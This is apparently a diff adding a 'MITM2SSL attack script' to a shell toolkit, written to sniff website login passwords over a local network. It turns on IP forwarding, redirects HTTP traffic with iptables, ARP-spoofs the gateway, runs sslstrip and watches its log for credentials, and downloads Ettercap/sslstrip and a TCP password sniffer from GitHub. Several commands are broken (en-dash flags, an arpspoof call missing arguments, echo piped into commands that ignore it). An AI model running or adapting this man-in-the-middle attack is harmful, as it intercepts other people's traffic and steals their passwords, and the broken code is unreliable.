@@ -14,3 +14,22 @@ echo "Monitoring SSLdump Log Live For Site Login Passwords" | watch -n 0,2 sslst
 echo
 echo Done!
 done
+
+
+#### IMPLEMENT INTO OWN SCRIPT IN MASTER SHELL
+echo "          MITM2SSL ATTACK SCRIPT       "
+echo
+echo "MITM Over SSL - Sniffing Out Passeords Over SSL"
+echo "IPV4Forwars" | echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "Rerouting HTTPS Traffic To SSLsplit" | iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 8080
+echo "Locating Network Gateway" | route -n | grep gateway
+echo "Poisioning Wireless Routing And Switching Traffic Destinations" | arpspoof -i -t
+echo "Listening For Decrypted SSL Traffic In Plaintext" | sslstrip -l 8080
+echo "Monitoring SSLdump Log Live For Site Login Passwords" | watch -n 0,2 sslstrip.log
+echo
+echo "EtterSSL: Ettercap & SSLstrip Package" | cd /opt && sudo git clone https://github.com/DynamicDesignz/Ettercap-and-sslstrip.git
+echo
+echo
+echo "TCPdump Password Sniffer" | cd /usr/local/bin && sudo wget https://raw.githubusercontent.com/DynamicDesignz/master_shell/master/tcppasssniff
+echo
+
